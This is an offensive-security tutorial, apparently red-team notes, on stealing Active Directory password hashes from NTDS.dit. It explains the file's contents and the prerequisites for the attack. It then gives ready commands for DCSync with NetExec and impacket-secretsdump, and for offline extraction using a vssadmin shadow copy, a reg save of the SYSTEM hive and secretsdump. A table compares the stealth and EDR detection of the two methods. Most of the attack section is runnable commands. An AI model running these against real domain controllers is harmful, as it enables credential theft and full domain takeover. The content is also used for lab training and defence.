**NTDS.dit** is the Active Directory database file stored on Domain Controllers.  
It contains:

- All domain user accounts
    
- NTLM password hashes
    
- Kerberos keys (including `krbtgt`)
    
- Computer accounts
    
- AD schema and replication metadata
    

Compromising NTDS.dit results in a **full domain compromise**.

Default location on a Domain Controller:

```
C:\Windows\NTDS\NTDS.dit
```

The hashes stored in NTDS.dit are encrypted using a boot key stored in the **SYSTEM** hive.  
Therefore, **NTDS.dit + SYSTEM** are both required for offline extraction.

---

## Prerequisites

To attack NTDS.dit, the attacker must have one of the following:

- Domain Admin privileges
    
- Local Administrator privileges on a Domain Controller
    
- Equivalent replication rights (for DCSync-style attacks)
    

---

## Online Extraction using NetExec (nxc) / secretsdump (DCSync-style)

This method does **not access NTDS.dit directly**. Instead, it abuses **Active Directory replication APIs (DRSUAPI)** to request password hashes from the Domain Controller as if the attacker were another DC.

This is commonly referred to as **DCSync**.

### How it works

- AD allows Domain Controllers to replicate credential data
    
- A Domain Admin can request this data remotely
    
- No files are copied
    
- No Volume Shadow Copy is required
    

### NetExec (nxc)

```bash
nxc smb <DC-IP> -u <user> -p <password> --ntds
```

Or dumping a specific user:

```bash
nxc smb <DC-IP> -u <user> -p <password> --ntds --user Administrator
```

Internally, NetExec uses techniques similar to Impacket’s `secretsdump` with the `DRSUAPI` method.

### secretsdump

```bash
impacket-secretsdump domain/user:password@<DC-IP>
```

Or dumping a specific user:

```bash
impacket-secretsdump domain/user:password@<DC-IP> -just-dc-user Administrator
```

---

## Offline Extraction via NTDS.dit Copy (VSS Method)

This method involves **copying the NTDS.dit file from disk** using **Volume Shadow Copy Service (VSS)**, then extracting hashes offline.

NTDS.dit cannot be copied directly because it is locked while AD is running.

### Steps Overview

1. Create a Volume Shadow Copy
    
2. Copy NTDS.dit from the shadow volume
    
3. Extract the SYSTEM hive
    
4. Transfer both files to the attacker machine
    
5. Dump hashes offline
    

### Create a Shadow Copy

```cmd
vssadmin create shadow /for=C:
```

Example output provides a path similar to:

```
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX
```

### Copy NTDS.dit from the Shadow Copy

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
```

### Export SYSTEM Hive

```cmd
reg save HKLM\SYSTEM C:\NTDS\SYSTEM
```

### Extract Hashes Offline (Attacker Machine)

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

---

## Comparison of Both Methods

| Aspect                         | DCSync (Online)                          | NTDS.dit Copy (Offline)             |
| ------------------------------ | ---------------------------------------- | ----------------------------------- |
| Technique                      | AD replication abuse                     | File system extraction              |
| Disk access                    | No                                       | Yes                                 |
| Requires VSS                   | No                                       | Yes                                 |
| Speed                          | Very fast                                | Slower                              |
| Stealth                        | Less disk noise, more network visibility | Very noisy on disk                  |
| EDR detection                  | Often monitored via replication alerts   | Triggers VSS and file access alerts |
| Works if LSASS is protected    | Yes                                      | Yes                                 |
| Requires SYSTEM hive           | No                                       | Yes                                 |
| Suitable for labs              | Excellent                                | Good but slower                     |
| Suitable for real environments | Risky but fast                           | High forensic footprint             |
